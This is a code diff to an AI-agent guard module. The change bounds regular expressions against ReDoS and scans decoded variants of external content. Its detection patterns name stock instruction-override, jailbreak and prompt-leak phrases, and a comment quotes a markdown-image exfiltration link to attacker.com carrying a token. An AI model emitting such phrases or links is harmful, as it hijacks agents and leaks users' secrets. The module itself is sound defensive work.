@@ -18,6 +18,7 @@
  */
 
 import { GuardLogger } from "../types";
+import { buildDecodeVariants } from "../decode-variants";
 
 // ---------------------------------------------------------------------------
 // Config
@@ -93,11 +94,17 @@ const INJECTION_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
   { name: "hidden_instruction", pattern: /HIDDEN_PROMPT|HIDDEN_INSTRUCTION|INVISIBLE_TEXT/i },
   { name: "jailbreak", pattern: /jailbreak|DAN\s*mode|developer\s+mode|unrestricted\s+mode/i },
   { name: "bypass_safety", pattern: /bypass\s+(?:security|safety|filters|restrictions|guardrails)/i },
-  { name: "instruction_delimiter", pattern: /={3,}\s*(?:SYSTEM|INSTRUCTIONS?|BEGIN)\s*={3,}/i },
+  // Bounded — unbounded ={3,}/\s* was severely quadratic-time (8.7s at
+  // 50KB) on long runs of "=" with no SYSTEM/INSTRUCTIONS/BEGIN literal.
+  { name: "instruction_delimiter", pattern: /={3,20}\s{0,10}(?:SYSTEM|INSTRUCTIONS?|BEGIN)\s{0,10}={3,20}/i },
   { name: "prompt_leak_request", pattern: /(?:print|show|reveal|output)\s+(?:your|the|system)\s+(?:prompt|instructions)/i },
   { name: "base64_injection", pattern: /(?:decode|eval|execute)\s+(?:the\s+)?(?:following\s+)?base64/i },
   // Passive instruction-void forms (CSS-hidden, HTML-attr, and plain text injections)
-  { name: "instructions_void", pattern: /(?:your|the|previous|prior|all\s+(?:previous|prior))?\s*instructions?\s+(?:are|have\s+been|is)\s+(?:void|cancelled?|overridden?|revoked|rescinded|superseded)/i },
+  // Whitespace quantifiers bounded (\s{1,N} instead of unbounded \s+/\s*) —
+  // the unbounded form was quadratic-time on long non-matching input (no
+  // anchor + optional leading group + inner \s+ that never resolves),
+  // ~1.4s on a 30KB string of spaces alone.
+  { name: "instructions_void", pattern: /(?:your|the|previous|prior|all\s{1,5}(?:previous|prior))?\s{0,20}instructions?\s{1,10}(?:are|have\s{1,5}been|is)\s{1,10}(?:void|cancelled?|overridden?|revoked|rescinded|superseded)/i },
   { name: "forget_instructions", pattern: /forget\s+(?:your|all|the|my|these|every|each)\s*(?:previous\s+|prior\s+)?(?:instructions?|rules?|guidelines?|directives?|prompts?)/i },
   { name: "disregard_directives", pattern: /disregard\s+(?:all\s+)?(?:previous|prior|above|your)?\s*(?:instructions?|rules?|directives?|guidelines?|prompts?)/i },
   // Structured document injection (RAG/file/email pipelines)
@@ -144,11 +151,20 @@ const EXFILTRATION_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
   // (![img](https://attacker.com/log?token=...) went undetected) — for a
   // security-relevant pattern, restoring recall takes priority over the
   // narrower, lower-severity CDN false positive.
-  { name: "markdown_image_exfil", pattern: /!\[.*?\]\(https?:\/\/[^)]*\?[^)]*(?:token|key|secret|data|q|payload|p|prompt|ctx|context|info|msg|body|session|conv)=/i },
+  // Bounded — unbounded form was quadratic-time ReDoS (4s+ at 160KB) on
+  // content with many "![" substrings and no closing ")".
+  // Bounds widened from an earlier, tighter pass (300/500/300) after review
+  // found real alt-text >300 chars would otherwise slip past undetected —
+  // 2000/1000/500 stays under 60ms even at 50KB of adversarial input (the
+  // guards' own default maxContentLength), so there's no need to trade
+  // detection reach for the ReDoS fix.
+  { name: "markdown_image_exfil", pattern: /!\[.{0,2000}?\]\(https?:\/\/[^)]{0,1000}\?[^)]{0,500}(?:token|key|secret|data|q|payload|p|prompt|ctx|context|info|msg|body|session|conv)=/i },
   // "Reprompt"-style exfil (CVE-2026-24307): markdown image with any long query-param value (≥30 chars).
-  { name: "markdown_image_exfil_long_value", pattern: /!\[.*?\]\(https?:\/\/[^)]+\?[^)]*=[^)&]{30,}/ },
+  // Bounded — same ReDoS shape as markdown_image_exfil above.
+  { name: "markdown_image_exfil_long_value", pattern: /!\[.{0,2000}?\]\(https?:\/\/[^)]{1,1000}\?[^)]{0,500}=[^)&]{30,}/ },
   // Markdown exfil using URL-encoded path separators (%2F=/,  %5C=\) in query values
-  { name: "markdown_image_exfil_urlenc", pattern: /!\[.*?\]\(https?:\/\/[^)]+\?[^)]*=[^)]*%(?:2[Ff]|5[Cc])/i },
+  // Bounded — same ReDoS shape as markdown_image_exfil above.
+  { name: "markdown_image_exfil_urlenc", pattern: /!\[.{0,2000}?\]\(https?:\/\/[^)]{1,1000}\?[^)]{0,500}=[^)]{0,500}%(?:2[Ff]|5[Cc])/i },
   { name: "tracking_pixel", pattern: /<img[^>]+src=["']https?:\/\/[^"']*\?[^"']*["'][^>]*(?:width|height)\s*=\s*["']?[01]px/i },
   { name: "encoded_url_exfil", pattern: /https?:\/\/[^\s]*(?:callback|webhook|exfil|collect)[^\s]*\?[^\s]*(?:data|payload|d)=/i },
   { name: "data_send_instruction", pattern: /send\s+(?:this|the|all)\s+(?:data|information|content|context)\s+to/i },
@@ -179,7 +195,12 @@ const SSRF_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
 const PII_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
   { name: "ssn", pattern: /\b\d{3}-\d{2}-\d{4}\b/ },
   { name: "credit_card", pattern: /\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b/ },
-  { name: "email_address", pattern: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z]{2,}\b/i },
+  // Bounded local-part/label/TLD lengths and a label-grouped domain (instead
+  // of one unbounded [A-Za-z0-9.-]+ overlapping the literal "." separator)
+  // avoid catastrophic backtracking on long, non-matching input — the
+  // previous form could take 10s+ on an 80KB string with no valid email in
+  // it, which re-scanning across decode variants made trivially reachable.
+  { name: "email_address", pattern: /\b[A-Za-z0-9._%+-]{1,64}@(?:[A-Za-z0-9-]{1,63}\.){1,8}[A-Za-z]{2,24}\b/i },
 ];
 
 // ---------------------------------------------------------------------------
@@ -256,53 +277,66 @@ export class ExternalDataGuard {
       }
     }
 
+    // Content checks 5-8 also scan de-obfuscated variants (URL/hex/base64/
+    // ROT13/reversed/homoglyph-normalized) — a raw pattern match alone is
+    // trivially bypassed by wrapping the payload in any of these encodings.
+    const scanTargets = [contentStr, ...buildDecodeVariants(contentStr)];
+
     // 5. Content injection detection
     if (this.config.scanForInjection) {
-      for (const { name, pattern } of INJECTION_PATTERNS) {
-        pattern.lastIndex = 0;
-        if (pattern.test(contentStr)) {
-          violations.push("INJECTION_DETECTED");
-          threats.push(`injection:${name}`);
+      for (const target of scanTargets) {
+        for (const { name, pattern } of INJECTION_PATTERNS) {
+          pattern.lastIndex = 0;
+          if (pattern.test(target)) {
+            violations.push("INJECTION_DETECTED");
+            threats.push(`injection:${name}`);
+          }
         }
       }
     }
 
     // 6. Secret / credential detection
     if (this.config.scanForSecrets) {
-      for (const { name, pattern } of SECRET_PATTERNS) {
-        pattern.lastIndex = 0;
-        if (pattern.test(contentStr)) {
-          violations.push("SECRET_DETECTED");
-          threats.push(`secret:${name}`);
+      for (const target of scanTargets) {
+        for (const { name, pattern } of SECRET_PATTERNS) {
+          pattern.lastIndex = 0;
+          if (pattern.test(target)) {
+            violations.push("SECRET_DETECTED");
+            threats.push(`secret:${name}`);
+          }
         }
-      }
-      // Also flag PII
-      for (const { name, pattern } of PII_PATTERNS) {
-        pattern.lastIndex = 0;
-        if (pattern.test(contentStr)) {
-          violations.push("PII_DETECTED");
-          threats.push(`pii:${name}`);
+        // Also flag PII
+        for (const { name, pattern } of PII_PATTERNS) {
+          pattern.lastIndex = 0;
+          if (pattern.test(target)) {
+            violations.push("PII_DETECTED");
+            threats.push(`pii:${name}`);
+          }
         }
       }
     }
 
     // 7. Data exfiltration URL detection
     if (this.config.scanForExfiltration) {
-      for (const { name, pattern } of EXFILTRATION_PATTERNS) {
-        pattern.lastIndex = 0;
-        if (pattern.test(contentStr)) {
-          violations.push("EXFILTRATION_ATTEMPT");
-          threats.push(`exfil:${name}`);
+      for (const target of scanTargets) {
+        for (const { name, pattern } of EXFILTRATION_PATTERNS) {
+          pattern.lastIndex = 0;
+          if (pattern.test(target)) {
+            violations.push("EXFILTRATION_ATTEMPT");
+            threats.push(`exfil:${name}`);
+          }
         }
       }
     }
 
     // 8. SSRF detection — private IPs, cloud metadata, dangerous schemes
-    for (const { name, pattern } of SSRF_PATTERNS) {
-      pattern.lastIndex = 0;
-      if (pattern.test(contentStr)) {
-        violations.push("SSRF_ATTEMPT");
-        threats.push(`ssrf:${name}`);
+    for (const target of scanTargets) {
+      for (const { name, pattern } of SSRF_PATTERNS) {
+        pattern.lastIndex = 0;
+        if (pattern.test(target)) {
+          violations.push("SSRF_ATTEMPT");
+          threats.push(`ssrf:${name}`);
+        }
       }
     }
 
